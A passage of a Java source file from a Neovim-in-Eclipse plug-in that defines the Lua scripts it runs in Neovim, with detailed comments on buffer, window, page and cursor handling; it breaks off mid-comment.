// SPDX-FileCopyrightText: 2026 Jm6CnDDXBwFTakS
// SPDX-License-Identifier: EPL-2.0

package io.github.jm6cnddxbwftaks.neovim4eclipse.core;

import java.util.Map;

/**
 * Every Lua script the plug-in runs inside Neovim via {@code nvim_exec_lua}, one field each, so
 * that callers name a script and tests can find each one ({@code LuaScriptsInNeovimTest} reads
 * every field).
 *
 * <p>Two kinds:
 * <ul>
 *   <li>Short scripts, mostly calls into a module ({@code SHOW_WINDOW}), are Java text blocks
 *       here, with comments.</li>
 *   <li>The Neovim modules the plug-in installs ({@code neovim4eclipse.paths}, ...) and the other
 *       large scripts are Lua files in {@code core/lua/}, which an editor shows as Lua and where
 *       their comments are. Their field is the script {@link LuaModules#script} makes of the file,
 *       read when this class loads: example {@link #PATHS}.</li>
 * </ul>
 *
 * <p>A field read from a file is no compile-time constant: a change to the file needs no rebuild
 * of the classes that use the field, only the build's copy of the file (it is a resource) and,
 * for an Eclipse already running, a restart, since the file is read once, when this class loads.
 * The text blocks are constants, which javac copies into every class that uses them (AGENTS.md,
 * "Pitfalls").
 */
final class LuaScripts {

    private LuaScripts() {
    }

    /**
     * One-time session setup: options plus autocmds that push state to Eclipse. The code and its
     * comments: {@code core/lua/setup.lua}.
     */
    static final String SETUP = LuaModules.script("setup.lua");

    /**
     * Hands the ex commands Eclipse carries out ({@code :w}, {@code :q}, {@code :e file},
     * {@code :tabn} ...; see {@code util/HostCommand}) from Neovim's command line to Eclipse. The
     * code and its comments: {@code core/lua/host_commands.lua}.
     */
    static final String HOST_COMMANDS = LuaModules.script("host_commands.lua");

    /**
     * Everything the UI needs after a key, in ONE round trip:
     * {@code {cursor_line, cursor_col, vstart_line, vstart_col, vend_line, vend_col, mode, recording,
     * statusline, bufnr, block, full_mode, folds, winid}}. {@code bufnr} tells whether the cursor is still in the
     * buffer Eclipse shows (Neovim may just have jumped to another file), {@code winid} whether it is
     * still in the attached editor's window (docs/design/WINDOWS.md). {@code full_mode} is
     * {@code nvim_get_mode().mode} ({@code "n"}, {@code "no"}, {@code "c"}, ...), the mode the editor
     * publishes; {@code mode} ({@code mode()}, one letter) is the visual mode for the selection.
     *
     * <p>The cursor is {@code nvim_win_get_cursor} (1-based line, 0-based byte column); the visual
     * bounds are {@code getpos} (1-based lines and byte columns) and only meaningful in visual mode.
     * {@code recording} is the register being recorded into ({@code reg_recording()}), or "".
     *
     * <p>{@code block}, in blockwise visual mode only ({@code mode()} is Ctrl-V,
     * {@code string.char(22)}), is what each line of the block covers, from {@code getregionpos()}
     * (Neovim 0.10), flat: {@code line, first byte, last byte} per line, 1-based (see
     * {@code util/BlockSelection}). Neovim
     * does the screen-cell arithmetic: tabs, wide characters, {@code $}. Example: {@code Ctrl-V},
     * {@code j}, {@code l} from the start of {@code "abc"} and {@code "def"} gives
     * {@code {1, 1, 2, 2, 1, 2}}. 5000 lines take about 3 ms (Neovim 0.12.6).
     *
     * <p>The first argument, {@code "1"}, adds the current window's status line, as
     * {@link #STATUS_LINE}'s {@code line} answers it, for the row under the focused editor's text;
     * with {@code "0"}, or before that module is loaded, it is {@code {false}} (no line). The second, {@code "1"} when folding is on ({@link #FOLDS}), adds {@code folds}:
     * the indexes of the outermost closed folds, from the fold module's {@code poll} (the per-key
     * trigger); with {@code "0"} it is an empty list that nothing reads. Messages and the pending command ({@code showcmd}) are not read here: Neovim
     * sends them as UI events ({@code ext_messages}; see {@code StatusTracker}).
     */
    static final String STATE_SNAPSHOT = """
            local want_line, want_folds = ...
            want_line, want_folds = want_line == '1', want_folds == '1'
            local c = vim.api.nvim_win_get_cursor(0)
            local s = vim.fn.getpos('v')
            local e = vim.fn.getpos('.')
            local statusline = { false }
            local lines = package.loaded['neovim4eclipse.statusline']
            if want_line and lines then
              statusline = lines.line(vim.api.nvim_get_current_win())
            end
            local mode = vim.fn.mode()
            local block = {}
            if mode == string.char(22) then -- Ctrl-V, spelled so because a backslash escape is Java's too
              for _, line in ipairs(vim.fn.getregionpos(s, e, { type = mode, eol = true })) do
                block[#block + 1] = line[1][2] -- the line
                block[#block + 1] = line[1][3] -- its first byte
                block[#block + 1] = line[2][3] -- its last byte
              end
            end
            local folds = {}
            if want_folds and package.loaded['neovim4eclipse.folds'] then
              folds = package.loaded['neovim4eclipse.folds'].poll(vim.api.nvim_get_current_win())
            end
            return { c[1], c[2], s[2], s[3], e[2], e[3], mode, vim.fn.reg_recording(), statusline,
                     vim.api.nvim_get_current_buf(), block, vim.api.nvim_get_mode().mode, folds,
                     vim.api.nvim_get_current_win() }
            """;

    /**
     * Deletes the empty, unnamed buffer Neovim starts with (argument: the number of the buffer that
     * replaced it), so that {@code :ls} lists only the files open in Eclipse. Buffers with text or a
     * name, e.g. created by the user's config, are left alone, and so are a plug-in's scratch
     * buffers ({@code 'buftype'} set): one may be in the float the config left the focus in
     * ({@link #LEAVE_START_FLOAT}), which deleting it would close.
     */
    static final String DELETE_STARTUP_BUFFER = """
            local keep = tonumber(select(1, ...))
            for _, b in ipairs(vim.api.nvim_list_bufs()) do
              if b ~= keep and vim.api.nvim_buf_get_name(b) == '' and not vim.bo[b].modified and vim.bo[b].buftype == ''
                  and vim.api.nvim_buf_line_count(b) == 1 and vim.api.nvim_buf_get_lines(b, 0, 1, false)[1] == '' then
                pcall(vim.api.nvim_buf_delete, b, { force = true })
              end
            end
            """;

    /**
     * Creates the buffer for a document (argument: the file's full name) and returns its number: listed,
     * loaded and empty, without a swap file, as {@code nvim_create_buf(true, true)} makes it, but named
     * the way {@code :e} names a buffer. The text is pushed afterwards, and {@link #DOCUMENT_BUFFER}
     * turns {@code buftype=nofile} into {@code acwrite}.
     *
     * <p>Why not {@code nvim_buf_set_name}: it marks the buffer "not edited", as {@code :file name}
     * does, and once the buffer is {@code acwrite} Neovim's file info says so:
     * {@code "/path/a.txt" [Not edited] 3 lines --33%--} where Neovim shows
     * {@code "/path/a.txt" 3 lines --33%--} for a file it read. {@code bufadd()} names the buffer
     * without that mark. {@code bufload()} with {@code buftype=nofile} loads it without reading the
     * file (Eclipse's text, unsaved changes included, comes next); {@code :noautocmd} keeps it from
     * firing {@code BufReadCmd}, {@code BufEnter} and {@code BufWinEnter}, as it enters the buffer for
     * a moment, so the events are those of {@code nvim_create_buf}: {@code BufNew} and {@code BufAdd}.
     * (Neovim keeps an {@code acwrite} buffer's name as given, a full path, even after {@code :lcd}.)
     *
     * <p><b>A buffer of that name already</b> ({@code bufadd()} returns it) is the same file, and is
     * reused, as Vim's {@code :e} reuses the buffer {@code :bd} kept (docs/design/BUFFER_NUMBERS.md):
     * same number, marks and last cursor position. Example: a.txt was buffer 1, its editor closed
     * (CLOSE_DOCUMENT_BUFFER unloaded it), and opening it again gives buffer 1, not 3. It may be
     * loaded already, with the file's text from disk, when Neovim moved into it by itself
     * ({@code :b 1}, {@code Ctrl-^}); Eclipse's text replaces that. Only a buffer that is another
     * document's now ({@code acwrite}, see {@link #DOCUMENT_BUFFER}), or a special one (help, a
     * terminal), is not reused: a new buffer is made, left unnamed (the second result is
     * {@code false}), since two documents must not share one. Except a help buffer no window shows
     * (a help page the help editor showed before, kept for {@code Ctrl-T} and {@code :helpgrep}'s
     * list; {@link #WINDOWS}, {@code take_help}). It is wiped, and the document gets its name, as if
     * no help had been opened (example: {@code :help myplugin}, then {@code doc/myplugin.txt} opened
     * in an editor from the plug-in's repository); that file's entries in the list are lost. While
     * the help editor shows that page, the document's buffer stays unnamed instead, as for any
     * special buffer. The third result says whether the
     * buffer was reused: its first push then puts the cursor on {@code '"} ({@link #GO_TO_LAST_POSITION}).
     */
    static final String CREATE_DOCUMENT_BUFFER = """
            local name = select(1, ...)
            local buf
            local reused = vim.fn.bufexists(name) == 1
            if reused then
              buf = vim.fn.bufadd(name) -- the existing one, by its exact name
              if vim.bo[buf].buftype == 'help' and #vim.fn.win_findbuf(buf) == 0 then
                vim.api.nvim_buf_delete(buf, { force = true })
                buf = vim.fn.bufadd(name)
                reused = false
              elseif vim.bo[buf].buftype ~= '' then
                return { vim.api.nvim_create_buf(true, true), false, false }
              end
            else
              buf = vim.fn.bufadd(name)
            end
            vim.bo[buf].buftype = 'nofile'
            vim.bo[buf].bufhidden = 'hide'
            vim.bo[buf].swapfile = false
            vim.bo[buf].modeline = false
            if not vim.api.nvim_buf_is_loaded(buf) then
              vim.cmd('noautocmd call bufload(' .. buf .. ')')
            end
            vim.bo[buf].buflisted = true
            return { buf, true, reused }
            """;

    /**
     * Places Neovim's cursor after an editor's attach push, where Vim would after {@code :e}, and
     * returns whether it moved it (the editor's caret then follows). Argument: {@code "true"} when
     * the buffer was reused (CREATE_DOCUMENT_BUFFER), else {@code "false"}. Two cases, the first
     * wins:
     * <ul>
     *   <li>{@code :e +cmd name} sent Eclipse to open this file: the {@code +cmd} runs now, once
     *       the document is in the buffer ({@link #HOST_COMMANDS}, {@code take_open_command}).
     *       Example: {@code :e +40 a.txt} opens a.txt with the caret on line 40, {@code :e + a.txt}
     *       on its last line.</li>
     *   <li>A reused buffer: the cursor goes to its {@code '"} mark, where the cursor was when its
     *       window last left it (not when the mark is unset or past the end). Vim puts the cursor
     *       there on {@code :e} of a buffer {@code :bd} kept (docs/design/BUFFER_NUMBERS.md, 2.2).
     *       Example: a.txt closed with the cursor on line 40; opened again, its caret is on line
     *       40, not line 1.</li>
     * </ul>
     */
    static final String GO_TO_LAST_POSITION = """
            local reused, buf, win = ...
            buf, win = tonumber(buf), tonumber(win)
            -- By number, not the current window: Neovim may be in a plug-in's float during an attach.
            if not vim.api.nvim_buf_is_valid(buf) or not vim.api.nvim_win_is_valid(win)
                or vim.api.nvim_win_get_buf(win) ~= buf then
              return false
            end
            local file = vim.b[buf].neovim4eclipse_file
            local host = package.loaded['neovim4eclipse.host_commands']
            if file and host and host.take_open_command then
              -- In the document's window as it is, so that a +cmd that moves (:e +tabnext name) keeps its
              -- move. Only with Neovim in a float does it run from there, and Neovim stays in the float.
              local ran
              if win == vim.api.nvim_get_current_win() then
                ran = host.take_open_command(file)
              else
                vim.api.nvim_win_call(win, function() ran = host.take_open_command(file, true) end)
              end
              if ran then
                return true
              end
            end
            if reused ~= 'true' then
              return false
            end
            local mark = vim.api.nvim_buf_get_mark(buf, '"')
            if mark[1] < 1 or mark[1] > vim.api.nvim_buf_line_count(buf) then
              return false
            end
            return pcall(vim.api.nvim_win_set_cursor, win, mark)
            """;

    /**
     * Makes a buffer the current one (argument: its number) without Neovim's file info message, such
     * as {@code "a.txt" 3 lines --33%--}.
     *
     * <p><b>A deliberate exception: the plug-in changes a user setting here.</b> The plug-in otherwise
     * leaves {@code 'shortmess'} as the user's config sets it. Neovim gives the file info after
     * entering a loaded buffer unless {@code 'shortmess'} has {@code F} (it does by default; many
     * configs carried over from Vim set it without). The plug-in switches buffers whenever another
     * Eclipse editor becomes active, and there the message does harm, for technical reasons:
     * <ul>
     *   <li>Eclipse shows nothing when you switch editors; the message would be Neovim's alone.</li>
     *   <li>Switching away and back gives two messages before the next key, which Neovim shows as
     *       two lines, collapsed with a spill count.</li>
     *   <li>Without the focus, Eclipse's Undo does not select the text it brings back (JFace selects
     *       it only in the focused widget), so Neovim's cursor ends up a line off and {@code jdd}
     *       deletes the wrong line ({@code FileInfoEndToEndTest}).</li>
     * </ul>
     * So {@code F} is added for the switch alone, and the user's value is put back right away:
     * Neovim decides about the message while entering the buffer, so this changes nothing about a
     * {@code :b} the user types, which Neovim runs by itself. {@code :silent} would also
     * hide the message, but it would hide every other message of the switch too, such as one from
     * the user's own {@code BufEnter} autocommand. docs/USER_GUIDE.md, "Neovim settings the plug-in changes",
     * lists this for users.
     */
    static final String SHOW_BUFFER = """
            local buf = tonumber(select(1, ...))
            local saved = vim.o.shortmess
            if not saved:find('F', 1, true) then
              vim.o.shortmess = saved .. 'F'
            end
            local ok, err = pcall(vim.api.nvim_set_current_buf, buf)
            vim.o.shortmess = saved
            if not ok then
              error(err, 0)
            end
            """;

    /**
     * Leaves a floating window the user's config left the focus in, before the plug-in sets up
     * Neovim's windows: lazy.nvim's installer on the first start of a LazyVim config. Left current,
     * the home buffer would go into it ({@link #SHOW_BUFFER}). The focus moves to a plain window
     * of the tab; the float stays until the session closes it ({@link #CLOSE_START_FLOAT}, at the
     * start's end).
     * Answers the float's window, or {@code 0} when there was none.
     * Run first, right after {@link #PATHS}. Example: with lazy.nvim's window 1001 current,
     * answers 1001 and leaves the plain window current.
     */
    static final String LEAVE_START_FLOAT = """
            local float = vim.api.nvim_get_current_win()
            if vim.api.nvim_win_get_config(float).relative == '' then
              return 0
            end
            for _, win in ipairs(vim.api.nvim_tabpage_list_wins(0)) do
              if vim.api.nvim_win_get_config(win).relative == '' then
                vim.api.nvim_set_current_win(win)
                return float
              end
            end
            return 0
            """;

    /**
     * Settles the float that has the keyboard as Neovim's start ends ({@link #WINDOWS}'
     * {@code close_start_floats}): one the editor draws keeps it, as in a terminal, the one
     * {@link #LEAVE_START_FLOAT} left (argument: its window, or 0) being entered again; one it does
     * not draw is closed, with a message, and Neovim goes to the window Eclipse has attached. At
     * once when Neovim has entered, else at {@code UIEnter}, after every {@code VimEnter} and
     * before any key typed meanwhile is read. Run once, at every start, after {@link #WINDOWS} and
     * ui2, so that the message is shown.
     */
    static final String CLOSE_START_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].close_start_floats(tonumber((...)))
            """;

    /**
     * Makes window {@code win} (first argument, its id as a string) Neovim's current window, the
     * focus moving to a page's window ({@code DocumentBuffers.focusPage}), and gives it the folder
     * of window {@code from} (second argument, the attached editor's; -1 for none), so that a
     * relative name typed in the page ({@code :e b.txt}) is the code's, as {@code :e} from the code
     * would take it. With autocommands: entering a window is what the user's config and Neovim
     * expect to hear about, as for any window. Returns the window's id, or -1 for a window that no
     * longer exists (nothing entered). The folder is set with {@code chdir()}, never a command
     * line ({@link #WINDOWS}, {@code set_folder}): {@code chdir()} runs nothing in a name but
     * expands {@code $VAR}, so a folder with {@code $} in its name is not given.
     */
    static final String FOCUS_WINDOW = """
            local win, from = tonumber((select(1, ...))), tonumber((select(2, ...)))
            if not win or not vim.api.nvim_win_is_valid(win) then
              return -1
            end
            if from and from > 0 and vim.api.nvim_win_is_valid(from) and not vim.o.autochdir then
              -- Read by window and tabpage number: getcwd() with only the window id of another
              -- tabpage finds no window, and getcwd() inside nvim_win_call() on one answers with
              -- another window's folder (probed on 0.12.6).
              local at = vim.fn.win_id2tabwin(from)
              local folder = vim.fn.getcwd(at[2], at[1])
              -- The windows module is always there: WINDOWS is sent at the session's start, before
              -- any page can open (NeovimSession), so the nil check only keeps an error out.
              local windows = package.loaded['neovim4eclipse.windows']
              if folder ~= '' and windows then
                windows.set_folder(win, folder) -- a folder with $ is refused there
              end
            end
            vim.api.nvim_set_current_win(win)
            return win
            """;

    /**
     * Installs the module {@code neovim4eclipse.windows}: a Neovim window per Eclipse editor, each
     * alone in its own tabpage (docs/design/WINDOWS.md; Java side {@code DocumentBuffers} and
     * {@code EditorWindows}). The code and its comments: {@code core/lua/windows/}, five files sent
     * as one script, each a chunk of its own, in this order ({@code init.lua} says how they share).
     */
    static final String WINDOWS = LuaModules.script("windows/init.lua", "windows/pages.lua", "windows/floats.lua",
            "windows/start.lua", "windows/net.lua");

    /**
     * Vim's window commands, carried out on Eclipse's editors: each Vim window is an editor, and a
     * split is a new editor stack beside the current one (docs/design/SPLITS.md). The code and its
     * comments: {@code core/lua/window_commands.lua}.
     */
    static final String WINDOW_COMMANDS = LuaModules.script("window_commands.lua");

    /**
     * Eclipse's <i>Toggle Split Editor</i> in an editor Neovim drives (argument: "1" for side by
     * side, "0" for one above the other): Neovim sends the split back as {@code :vsplit} or
     * {@code :split} would, so {@code 'splitright'} and {@code 'splitbelow'} decide the side
     * ({@link #WINDOW_COMMANDS}; {@code editor/SplitEditorHandler}).
     */
    static final String SPLIT_WINDOW = """
            require('neovim4eclipse.window_commands').split(select(1, ...) == '1')
            """;

    /**
     * The home buffer's number, made anew if Neovim wiped it ({@code M.home_buffer} in
     * {@link #WINDOWS}). Example: a plug-in ran {@code :bwipeout 2} (the home buffer's usual number:
     * Neovim's own buffer 1 is wiped at start); Eclipse, finding the home buffer
     * gone when it goes back to it, gets 9, a new unlisted scratch buffer, and shows that.
     */
    static final String HOME_BUFFER = """
            return require('neovim4eclipse.windows').home_buffer()
            """;

    /**
     * A page's text in the editing Neovim, for a page editor shown from a window of this Neovim
     * (the messages page): puts text into the page's own buffer, made on first use, and returns
     * its number. Arguments: the page's name ({@code "messages"}); the lines; the lines to color, as
     * {@code {line, group}} pairs (0-based lines, Neovim's highlight groups: {@code {0, "ErrorMsg"}});
     * and {@code "end"} or {@code "top"}, where the page's windows put the cursor ({@code :messages}:
     * on the newest message, the last line).
     *
     * <p>The buffer is a scratch one that no file has ({@code buftype=nofile}, unlisted, no swap
     * file, kept when hidden), named {@code neovim4eclipse://<name>} so that {@code :ls!} and the
     * status line say what it is, and changeable only while its text is set ({@code nomodifiable}
     * again at the end), so a page can never be typed into or written by accident: every write
     * that runs autocommands, {@code :w x}, {@code :1w x} and {@code :w >> x} too, gets Vim's E382
     * from the page's own write hooks. Two deliberate commands still work, as they skip those
     * hooks by design: {@code :noautocmd w x} writes the page's text to {@code x}, and
     * {@code :w !cmd} hands it to a shell command. Made and filled quietly: no {@code BufNew},
     * {@code BufFilePost} or {@code TextChanged} for the user's config or the plug-in's own buffer hooks, which are about files. {@code q} in it
     * closes the page editor ({@code :Eclipse quit}, which names the page's window as its origin);
     * a {@code q} the user mapped for the buffer is kept. The colors are the user's: this is their
     * Neovim. Example: {@code ("messages", {"E486: x", "3 lines yanked"}, {{0, "ErrorMsg"}}, "end")}
     * fills {@code neovim4eclipse://messages} with two lines, the first in the error color.
     */
    static final String PAGE_TEXT = """
            local name, lines, highlights, cursor = ...
            local full = 'neovim4eclipse://' .. name
            local saved = vim.o.eventignore
            vim.o.eventignore = 'all'
            local ok, result = pcall(function()
              -- Found by a mark of the plug-in's own, not by the name: a buffer that only took the
              -- same name (gf on the text neovim4eclipse://messages) is never taken for the page.
              local buf
              for _, b in ipairs(vim.api.nvim_list_bufs()) do
                if vim.b[b].neovim4eclipse_page == name then
                  buf = b
                end
              end
              if not buf then
                buf = vim.api.nvim_create_buf(false, true)
                pcall(vim.api.nvim_buf_set_name, buf, full)
                vim.b[buf].neovim4eclipse_page = name
                -- Never written: 'nofile' refuses a plain :w (E382), but Vim writes such a buffer
                -- under a name (:w x, :1w x, :w >> x, :w! x), straight to disk, behind Eclipse.
                -- Every write to a file that runs autocommands runs one of these, so each is
                -- refused and writes nothing. Not caught, on purpose: :noautocmd w x and :w !cmd,
                -- commands the user types knowing what they do. Yanking the text into an editor
                -- still works.
                -- The error as Vim words it, through nvim_echo: a Lua error() would show a stack
                -- traceback after it (probed on 0.12.6). Neovim puts its own line before it,
                -- "Error in BufWriteCmd Autocommands for ...", as for any autocommand's error.
                for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
                  vim.api.nvim_create_autocmd(event, {
                    buffer = buf,
                    callback = function()
                      vim.api.nvim_echo({ { "E382: Cannot write, 'buftype' option is set" } }, true, { err = true })
                    end,
                  })
                end
              end
              local bo = vim.bo[buf]
              bo.buftype, bo.bufhidden, bo.swapfile, bo.buflisted = 'nofile', 'hide', false, false
              bo.modifiable = true
              vim.api.nvim_buf_set_lines(buf, 0, -1, false, lines)
              bo.modifiable, bo.modified = false, false
              local ns = vim.api.nvim_create_namespace('neovim4eclipse.page')
              vim.api.nvim_buf_clear_namespace(buf, ns, 0, -1)
              for _, h in ipairs(highlights) do
                pcall(vim.api.nvim_buf_set_extmark, buf, ns, h[1], 0, { line_hl_group = h[2] })
              end
              local own_q = vim.api.nvim_buf_call(buf, function()
                return vim.fn.maparg('q', 'n', false, true)
              end)
              if own_q.buffer ~= 1 or own_q.desc == 'Close the page editor' then
                vim.keymap.set('n', 'q', '<Cmd>Eclipse quit<CR>', { buffer = buf, nowait = true, desc = 'Close the page editor' })
              end
              local line = cursor == 'end' and vim.api.nvim_buf_line_count(buf) or 1
              for _, win in ipairs(vim.fn.win_findbuf(buf)) do
                pcall(vim.api.nvim_win_set_cursor, win, { line, 0 })
              end
              vim.b[buf].neovim4eclipse_page_cursor = cursor
              return buf
            end)
            vim.o.eventignore = saved
            if not ok then
              error(result, 0)
            end
            return result
            """;

    /**
     * Opens a page's window on a buffer (argument: its number) in a new tabpage, quietly, without
     * entering it, and returns its id; -2 when the buffer is gone. Its options are a page's, and
     * the IDE keys are Neovim's in that buffer. See {@link #WINDOWS} ({@code open_page}).
     */
    static final String OPEN_PAGE_WINDOW = """
            return require('neovim4eclipse.windows').open_page(tonumber((select(1, ...))))
            """;

    /**
     * Shows a buffer Neovim made for a page ({@code :help}'s help buffer, a {@code :checkhealth}
     * report) in a page window. Arguments: the page window's id ({@code -1}: open a new one), the
     * buffer, the line to put at the top, and the kind ({@code "help"}, {@code "checkhealth"}).
     * Returns the window, or -2 when the buffer is gone. See {@link #WINDOWS} ({@code show_page}).
     */
    static final String SHOW_PAGE_BUFFER = """
            local win, buf, line, kind = ...
            return require('neovim4eclipse.windows').show_page(tonumber(win), tonumber(buf), tonumber(line), kind)
            """;

    /**
     * Opens another page window like a page window (argument: its id), on the buffer it shows and
     * of its kind: a {@code :split} of the page. Returns {@code {window, buffer}}, or
     * {@code {-1, -1}} when it is no page window. See {@link #WINDOWS} ({@code open_page_like}).
     */
    static final String OPEN_PAGE_LIKE = """
            return require('neovim4eclipse.windows').open_page_like(tonumber((select(1, ...))))
            """;

    /**
     * Puts a page window's own buffer back into it (argument: the window id), after Neovim put
     * another there; returns the page's buffer, or -1 when it is no open page window. See
     * {@link #WINDOWS} ({@code restore_page}).
     */
    static final String RESTORE_PAGE_WINDOW = """
            return require('neovim4eclipse.windows').restore_page(tonumber((select(1, ...))))
            """;

    /**
     * Opens the window of an editor (arguments: the buffer number, and the folder for {@code :lcd},
     * "" to keep the one it copies) in a new tabpage, without entering it, and returns its id; -2,
     * nothing opened, when the buffer was wiped in Neovim (as {@link #SHOW_WINDOW}). Its jump
     * history starts empty. See {@link #WINDOWS}.
     */
    static final String OPEN_WINDOW = """
            local buf, folder = tonumber((select(1, ...))), (select(2, ...))
            return require('neovim4eclipse.windows').open(buf, folder)
            """;

    /**
     * Makes a window the current one, showing a buffer (arguments: the window id, -1 for the home
     * window, and the buffer number), and returns the id of the window shown, or without doing
     * anything -1 when that window was closed in Neovim (Eclipse then opens a new one), -2 when the
     * buffer was wiped there (Eclipse goes back to the home buffer: {@code DocumentBuffers.returnToAttached}).
     * Example: {@code ("1001", "3")} enters editor B's
     * window, which shows buffer 3 already; Neovim fires {@code BufEnter} for buffer 3 there, which
     * Eclipse recognizes as its own switch. See {@link #WINDOWS}.
     */
    static final String SHOW_WINDOW = """
            local win, buf = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').show(win, buf)
            """;

    /**
     * The Neovim half of a window travelling on {@code Ctrl-O} (arguments: the other editor's
     * window, the buffer left behind, its 1-based line and 0-based byte column): the other editor's
     * window, which is not the current one, is quietly given the buffer the jump left and its cursor.
     * {@code EditorWindows.swap} then gives each editor the other's window. See {@link #WINDOWS}.
     */
    static final String TRAVEL_WINDOW = """
            local win, buf = tonumber((select(1, ...))), tonumber((select(2, ...)))
            local line, col = tonumber((select(3, ...))), tonumber((select(4, ...)))
            require('neovim4eclipse.windows').travel(win, buf, line, col)
            """;

    /**
     * Eclipse's Back went nowhere for {@code Ctrl-O} steps (arguments: the first step's id and the
     * number of steps): the start of its history, or nothing visible changed. The trail of
     * {@link #SETUP} forgets them, so that {@code Ctrl-I} does not undo steps that moved nothing.
     */
    static final String HISTORY_NOWHERE = """
            require('neovim4eclipse.history').nowhere(tonumber((select(1, ...))), tonumber((select(2, ...))))
            """;

    /**
     * The user switched editors in Eclipse after a {@code Ctrl-O} that went Back (a tab click,
     * {@code F3}): the trail of {@link #SETUP} is forgotten, so {@code Ctrl-I} works as without it
     * (Neovim's newer jump, else Forward) instead of undoing a Back Eclipse no longer remembers.
     */
    static final String HISTORY_FORGET = """
            require('neovim4eclipse.history').forget()
            """;

    /**
     * Closes an editor's window and its tab quietly (arguments: the window id, and the buffer the
     * home window shows if the closed window was the current one: the home buffer instead if that
     * one was wiped), and returns the home window's id (it may have been opened again) and the home
     * buffer's number (it may have been made anew: {@code M.home_buffer}). Example: {@code {1000, 2}};
     * after a plug-in's {@code :bwipeout 2}, {@code {1000, 9}}. A plug-in's float with the cursor
     * in that tab is left first, its insert ended ({@code leave_float_of}). See {@link #WINDOWS}.
     */
    static final String CLOSE_WINDOW = """
            local win, fallback = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').close(win, fallback)
            """;

    /**
     * Closes a document's buffer after its last editor closed (argument: its number), as Vim's
     * {@code :bd} does: unloaded and unlisted, but kept, with its number, marks and last cursor
     * position, so that the file's next editor gets the same buffer back (CREATE_DOCUMENT_BUFFER;
     * docs/design/BUFFER_NUMBERS.md). Example: a.txt is buffer 1; closing its editor leaves
     * {@code 1u} in {@code :ls!}, and opening it again gives buffer 1, not a new number.
     *
     * <p>In order: the plug-in's autocommands for the buffer go (the write hook and the safety net
     * belong to a document with an editor); {@code 'buftype'} goes back to a normal file's, since
     * Neovim drops the marks of an {@code acwrite} buffer when it unloads it (BUFFER_NUMBERS.md, X4); then unload and
     * unlist. {@code b:neovim4eclipse_file} stays. Nothing for a buffer that is gone.
     *
     * <p><b>A buffer Neovim unloaded itself</b> is only unlisted: {@code nvim_buf_delete} with
     * {@code unload} fails ("Failed to unload buffer") on a buffer that is not loaded. Example: a
     * Lua plug-in, or {@code <Cmd>bd! 3<CR>}, runs {@code :bdelete! 3} (without {@code !} Neovim
     * refuses with E89 while the editor has unsaved changes, and nothing closes); the safety net in
     * {@link #DOCUMENT_BUFFER} tells Eclipse, which closes the editor, and this script then finds
     * buffer 3 unloaded and unlisted already. Its marks are kept all the same: the document's
     * {@code BufUnload} hook set {@code 'buftype'} to {@code ''} for that unload (X5), and the
     * {@code ''} set here keeps it a closed file's buffer instead of a document's.
     */
    static final String CLOSE_DOCUMENT_BUFFER = """
            local buf = tonumber((select(1, ...)))
            if not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            pcall(vim.api.nvim_clear_autocmds, { group = 'neovim4eclipse_document', buf = buf })
            vim.bo[buf].buftype = ''
            if vim.api.nvim_buf_is_loaded(buf) then -- not after Neovim's own :bdelete, which unloaded it
              vim.api.nvim_buf_delete(buf, { force = true, unload = true }) -- force: unsaved changes live in Eclipse
            end
            vim.bo[buf].buflisted = false
            """;

    /**
     * Renames a document's buffer after its file (arguments: the buffer's number, the new name), when
     * Eclipse moved the editor to another file: a rename or move of the open file, File › Save As
     * ({@code editor/EditorAttachManager.rebind}). The buffer stays, with its number, undo history
     * and marks, as after Vim's {@code :saveas}. Returns whether the buffer has the name now.
     *
     * <p>{@code b:neovim4eclipse_file} is set first: {@link #DOCUMENT_BUFFER}'s {@code BufFilePost}
     * check puts back a name that is not the file's (it undoes {@code :file new.txt}), and must find
     * the new name to be the file's. That check also wipes the unloaded buffer the rename leaves
     * under the old name (Vim's alternate file). Nothing for a buffer already so named (Neovim's own
     * {@code :saveas} renamed it) or one that is gone (it is made under the new name when shown).
     * The rename fails (E95) when a loaded buffer has the name already; then the old name and file
     * stay, and the caller closes the buffer, so that it is made anew under the new name.
     *
     * <p>Like any rename, it marks the buffer {@code [Not edited]} in its file info until the next
     * write; writes go through Eclipse ({@code BufWriteCmd}) and work as usual.
     */
    static final String RENAME_DOCUMENT_BUFFER = """
            local buf, name = tonumber((select(1, ...))), select(2, ...)
            if not vim.api.nvim_buf_is_valid(buf) then
              return true
            end
            local canonical = require('neovim4eclipse.paths').canonical -- PATHS: case, links, separators
            if canonical(vim.api.nvim_buf_get_name(buf)) == canonical(name) then
              vim.b[buf].neovim4eclipse_file = vim.api.nvim_buf_get_name(buf)
              return true
            end
            local before = vim.b[buf].neovim4eclipse_file
            vim.b[buf].neovim4eclipse_file = name
            if not pcall(vim.api.nvim_buf_set_name, buf, name) then
              vim.b[buf].neovim4eclipse_file = before
              return false
            end
            vim.b[buf].neovim4eclipse_file = vim.api.nvim_buf_get_name(buf) -- as Neovim names it (links resolved)
            return true
            """;

    /**
     * Splits lines that hold carriage returns into the lines Eclipse's document shows them as
     * (arguments: the buffer's number, its window, a list of {@code {line1, parts}}). Returns the
     * window's cursor after the split as {@code {line1, col0}}, or {@code nil} without a window.
     *
     * <p>Why: Neovim keeps {@code \r} inside a line ({@code Ctrl-V Ctrl-M}, {@code :s} with
     * {@code nr2char(13)}, {@code Ctrl-R Ctrl-R} of a register holding one); Eclipse takes it as a
     * line break, so the line is two there and the lines below it are numbered differently on each
     * side ({@code sync/SplitLines}). After this script Neovim holds Eclipse's lines. Neovim does the
     * split, rather than Eclipse pushing its lines, because only Neovim knows its cursor at that
     * moment: on {@code "beta1\r2x"} with the cursor after {@code x} (byte 8), the cursor goes to
     * the next line, byte 2, where Eclipse's caret is; a push would leave it on {@code "beta1"}. And
     * it is safe in the middle of an insert, while keys still arrive: the split is one step between
     * two keys, and its line events come in Neovim's order like theirs.
     *
     * <p>The parts come from Eclipse's document ({@code BufferSynchronizer.splitParts}), which
     * decides where its lines break: {@code "a\r"} before a {@code \n} is one line there when it was
     * loaded so, two when the {@code \r} was typed. A line is split only while it reads as its parts
     * joined by {@code \r}, or with one more {@code \r} at its end (which Eclipse keeps in a
     * {@code \r\n}); a key that changed it since leaves it to the next split. Bottom up, so the line
     * numbers above a split stay right.
     *
